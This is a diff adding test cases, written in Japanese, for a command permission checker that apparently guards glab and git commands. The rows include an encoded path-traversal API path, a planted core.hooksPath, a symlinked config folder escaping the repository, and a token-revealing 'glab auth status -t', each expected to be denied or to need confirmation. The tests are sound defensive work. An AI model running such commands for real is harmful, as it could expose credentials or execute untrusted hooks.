+%2eを含むプロジェクトのglab apiを渡すと、止める。	glab api projects/g%2F%2e%2e/merge_requests/1	-	deny	-	比べられない
+%2Fでつないでいないプロジェクトのglab apiを渡すと、確認を求める。	glab api projects/g/merge_requests/1	-	ask	-	確認なしで読む一覧に無い
+core.hooksPathが作業フォルダーの中を指すときに、glab mr viewを渡すと、確認を求める。	glab mr view 1	-	ask	git config core.hooksPath .husky/_	書ける設定かファイル
+gitのフォルダーにconfig.ymlのあるglab-cliがあるときに、glab mr viewを渡すと、確認を求める。	glab mr view 1	-	ask	mkdir .git/glab-cli && : > .git/glab-cli/config.yml	glabの設定のフォルダー
+gitのフォルダーのglab-cliがリンクのときに、glab mr viewを渡すと、確認を求める。	glab mr view 1	-	ask	ln -s ../outside .git/glab-cli	glabの設定のフォルダー
+gitのフォルダーに空のglab-cliのフォルダーがあるときに、glab mr viewを渡すと、通す。	glab mr view 1	-	allow	mkdir .git/glab-cli
+gitのフォルダーに空のglab-cliのファイルがあるときに、glab mr viewを渡すと、通す。	glab mr view 1	-	allow	: > .git/glab-cli
+gitのフォルダーにglab-cliがあるときも、-tを付けたglab auth statusを渡すと、止める。	glab auth status -t	-	deny	mkdir .git/glab-cli && : > .git/glab-cli/config.yml	引数を付けずに
+# ほかのコマンド
+空のコマンドを渡すと、止める。	-	-	deny
+git statusを渡すと、止める。	git status	-	deny
